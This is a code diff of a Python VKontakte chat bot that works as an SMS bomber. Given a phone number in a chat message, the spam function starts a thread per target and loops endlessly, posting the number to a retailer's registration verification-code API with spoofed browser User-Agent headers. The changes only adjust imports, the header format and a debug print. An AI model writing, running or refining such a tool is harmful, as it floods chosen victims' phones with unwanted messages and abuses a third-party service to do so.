@@ -1,10 +1,8 @@
 try:
-    import vk_api, threading, requests, fake_useragent, os, random
+    import vk_api, threading, requests, os, random
     from vk_api.longpoll import VkLongPoll, VkEventType
     from vk_api.utils import get_random_id
-
-
-
+    from fake_useragent import UserAgent
 
     def text1(arg):
         return arg.split()[1]
@@ -19,7 +17,7 @@ try:
 
 
     def spam(phone):
-        o = 0
+        print('j')
         phone = phone
         pulse = '+' + phone
         no7 = phone[1:] 
@@ -28,7 +26,7 @@ try:
         masska3 = phone[1:4] + '+' + phone[4:7] + '-' + phone[7:9] + '-' + phone[9:11]
         while range(5):
             ua = UserAgent()
-            headers = ua.random
+            headers = {'User-Agent': ua.chrome}
             try:
                 requests.post("https://lenta.com/api/v1/registration/requestValidationCode", json={"phone" : "+" + phone}, headers=headers)
             except:
@@ -126,5 +124,6 @@ try:
                     t = threading.Thread(target=spam, args=(nomer,))
                     t.start()
                     write_message(sender, 'Всё ок')
+
 except:
     os.system('python bot.py')
